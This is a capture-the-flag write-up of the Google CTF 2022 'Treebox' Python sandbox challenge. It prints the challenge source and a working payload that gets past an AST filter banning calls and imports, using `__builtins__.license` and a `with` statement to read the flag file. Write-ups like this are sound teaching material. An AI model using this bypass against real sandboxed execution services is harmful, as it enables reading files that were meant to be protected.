# Treebox
> I think I finally got Python sandboxing right.
>
> treebox.2022.ctfcompetition.com 1337

From the description, we know this is a Python sandbox challenge.
Connecting to the server gives us:
```
== proof-of-work: disabled ==
-- Please enter code (last line must contain only --END)
```
The proof of work is disabled, so we don't need to worry about that for this challenge. Below,
we can send Python code and end that code with `--END`.
However, trying some test code,
```python
print(1)
--END
```
throws an error
```
ERROR: Banned statement <ast.Call object at 0x7f55d45b31f0>
```

## Source Code
After downloading and extracting the zip, we get a single python file: `treebox.py`
```python
#!/usr/bin/python3 -u
#
# Flag is in a file called "flag" in cwd.
#
# Quote from Dockerfile:
#   FROM ubuntu:22.04
#   RUN apt-get update && apt-get install -y python3
#
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("-- Please enter code (last line must contain only --END)")
source_code = ""
while True:
  line = sys.stdin.readline()
  if line.startswith("--END"):
    break
  source_code += line

tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print("-- Executing safe code:")
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)
```

It seems `print(f"ERROR: Banned statement {x}")` was what was printing out the 
error we saw earlier. Going through the entire file, we can see that it reads
Python code line by line, compiles the code into an AST, performs some verification function,
then finally executes the code if the function passes.

From before, we know our `print(1)` does not pass the verification, so let's try 
and figure out exactly how the code works. First, we need to talk about ASTs.

## AST
ASTs, or Abstract Syntax Trees, are a tree representation of the code in a program.
They act like normal trees, except each node contains some instruction that would 
be executed. However, ASTs are abstract; they are not a true representation of 
what will actually be run by the program. For more information, check out their
[Wikipedia page.](https://en.wikipedia.org/wiki/Abstract_syntax_tree)

For Python, the `ast` module helps create and process these trees
programmatically. This line <br>
`tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)`<br>
compiles all the code we have submitted into a single tree that is passed into
the verification function.
```python
def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True
```
Taking a look at the `ast` module [documentation](https://docs.python.org/3/library/ast.html),
we see that `ast.walk(m)` yields every node in the tree, so `x` would be a single
node of that tree. `type(x)` is then matched against 3 different types, `ast.Import`,
`ast.ImportFrom`, and `ast.Call`. 

Looking at the documentation again, we can see that
`ast.Import` and `ast.ImportFrom` both deal with importing modules, while `ast.Call`
matches **ANY** function call. This is why our previous code `print(1)` errors out,
as `print()` is a function that is called in the code.

In the code, we also see `# Flag is in a file called "flag" in cwd.` meaning we need to 
somehow read a file without calling any functions.

### Function calls
Remember, an AST isn't a 1-to-1 copy of what will happen when the code is executed.
It compiles based on the code supplied. This means that automatic function calls 
are not considered as `ast.Call`. For example, the `__add__` dunder function, when
defined, is not considered a call to a function, even if it might actually
represent one.
```python
def __add__(self, other):
    # do something
    return
... # a and b are objects that use this add dunder
a + b # does not result in ast.Call when parsed in ast.walk
```
As long as the AST does not see the code as a function call, we can pretty much 
do whatever we want. 

## My solution
My solution is partly based off the solution to [`paas-v2` from HSCTF 9](https://github.com/hsncsclub/hsctf-9-challenges/tree/main/misc/paas-v2).
That solution manipulates the builtin license 
to read from an arbitrary file. I won't go over it too much in detail as I will just 
explain it with the rest of my solution.
```python
__builtins__.license._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.license
a.__class__.__exit__ = lambda self, *args: None
with a as b:
	pass
```
The first line sets the `_Printer__filenames` attribute of the builtin `license`
to `flag`, the name of the file we are trying to read. This makes it so that when
the `license()` function is called, the file that is read is `flag`, instead of 
the text file that it normally reads from.

Then, we set a variable to some object whose class attributes can be edited.
I used the builtin help, but as long as you can set a usable dunder function, any
object is okay. 

Before moving on the the next 2 lines, let's go over the last `with` statement first.
In Python, when a `with` statement is called, the `__enter__` method is used to 
assign a value to the other variable, while the `__exit__` method handles what
happens after exiting the `with` statement.
```python
with a as b:
    pass
# essentially
b = a.__enter__()
# do smth with b
a.__exit__()
```
Therefore, we can directly assign the `__enter__` and `__exit__` methods
of the class of the variable we just used. The `__enter__` method is set to the 
builtin license method, so that when the `__enter__` method is called, the license
method is called instead, which will print the contents of the file it is reading,
in this case printing the flag.

Running this code on the server gives our flag:
```python
== proof-of-work: disabled ==
-- Please enter code (last line must contain only --END)
__builtins__.license._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.license
a.__class__.__exit__ = lambda self, *args: None
with a as b:
        pass
        
--END
-- Executing safe code:
CTF{CzeresniaTopolaForsycja}
```
and we have our flag: `CTF{CzeresniaTopolaForsycja}`

## Other solutions
There where many **many** other solutions to this challenge, in fact that was one
aspect I really enjoyed about it. Many of them are completely different from my 
solution, so I suggest you check them out as well to learn more. In fact, before
looking at the other solutions, I was not even aware of many of the capabilites
of function decorators.

## Takeaways
- ASTs and the Python ast module
- Python's builtin methods/classes
- Different types of dunder methods
- Function decorators (not in my solution)
- Metaclasses (again not in my solution)